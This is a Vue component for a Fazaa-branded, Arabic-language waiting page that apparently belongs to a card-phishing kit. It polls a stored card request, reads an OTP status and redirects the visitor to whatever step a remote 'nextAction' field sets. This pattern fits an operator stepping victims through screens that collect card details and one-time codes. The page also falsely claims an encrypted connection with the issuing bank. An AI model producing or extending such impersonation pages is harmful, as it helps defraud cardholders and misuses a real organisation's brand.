<script setup lang="ts">
import { onMounted, onUnmounted, ref } from 'vue';
import { useRouter } from 'vue-router';
import { ShieldCheck } from 'lucide-vue-next';
import { getCardRequest, updateCardRequest, resolveTargetRoute } from '../api';

const router = useRouter();
const errorMessage = ref('');

let pollTimer: ReturnType<typeof setInterval> | null = null;

onMounted(() => {
  const checkStatus = async () => {
    try {
      const data = await getCardRequest();
      if (!data) {
        errorMessage.value = 'الطلب غير موجود.';
        return;
      }
      if (data.otpStatus === 'card_rejected') {
        if (pollTimer) clearInterval(pollTimer);
        await updateCardRequest(data.id, { nextAction: '' }).catch(() => {});
        router.push('/card-details');
        return;
      }
      const targetRoute = resolveTargetRoute(data.nextAction);
      if (targetRoute && targetRoute !== '/waiting') {
        if (pollTimer) clearInterval(pollTimer);
        await updateCardRequest(data.id, { nextAction: '' }).catch(() => {});
        router.push(targetRoute);
      }
    } catch (err) {
      console.error('Error polling request status:', err);
    }
  };

  checkStatus();
  pollTimer = setInterval(checkStatus, 1500);
});

onUnmounted(() => {
  if (pollTimer) {
    clearInterval(pollTimer);
  }
});
</script>

<template>
  <div dir="rtl" class="min-h-screen bg-[#f4f1ea] font-sans text-slate-900">
    <div class="max-w-xl mx-auto bg-[#faf8f4] min-h-screen flex flex-col justify-between shadow-[0_0_60px_rgba(11,31,56,0.12)] border-x border-[#e6decb]/80">
      
      <!-- Top Fazaa Header -->
      <header class="w-full h-16 px-5 flex items-center justify-center border-b border-[#8a6c1e]/40 relative overflow-hidden shadow-md">
        <img
          src="/assets/aistudio/header-background-gold.50f1dc5b.jpg"
          alt=""
          class="absolute inset-0 w-full h-full object-cover object-right pointer-events-none"
        />
        <div class="absolute inset-0 bg-gradient-to-l from-black/15 via-transparent to-black/25 pointer-events-none"></div>
        <img
          src="/assets/aistudio/fazaa-logo.png"
          alt="Fazaa Logo"
          class="relative z-10 h-12 w-auto object-contain drop-shadow-[0_2px_6px_rgba(0,0,0,0.3)]"
        />
      </header>

      <!-- Center Waiting Card -->
      <div class="px-5 my-auto">
        <div class="bg-white rounded-2xl p-7 shadow-[0_12px_35px_rgba(11,31,56,0.06)] border border-[#e6decb] flex flex-col items-center text-center max-w-sm mx-auto">
          <div class="relative flex items-center justify-center mb-5">
            <div class="animate-spin rounded-full h-16 w-16 border-4 border-[#f4f1ea] border-t-[#c5a44e]"></div>
            <span class="absolute text-[#0b1f38] font-black text-[10px] tracking-wider">FAZAA</span>
          </div>
          <h2 class="text-base font-extrabold text-[#0b1f38] mb-1.5">يرجى الانتظار</h2>
          <p class="text-slate-600 text-xs leading-relaxed">
            جاري التحقق من بيانات البطاقة وتأكيد طلب عضوية فزعة، يرجى عدم إغلاق أو تحديث هذه الصفحة...
          </p>
          
          <div v-if="errorMessage" class="text-red-600 bg-red-50 px-3 py-1.5 rounded-lg text-xs font-bold mt-4">
            {{ errorMessage }}
          </div>

          <div class="mt-5 pt-4 border-t border-slate-100 w-full flex items-center justify-center gap-1.5 text-[11px] text-[#9e7f2c] font-semibold">
            <ShieldCheck class="w-3.5 h-3.5" />
            <span>اتصال مشفر ومؤمّن مع البنك المصدر</span>
          </div>
        </div>
      </div>

      <!-- Bottom Fazaa Footer -->
      <footer class="bg-[#09192d] px-5 py-4 text-center text-[11px] text-slate-300 border-t border-[#c5a44e]/25">
        © 2026 Fazaa · كل الحقوق محفوظة
      </footer>

    </div>
  </div>
</template>
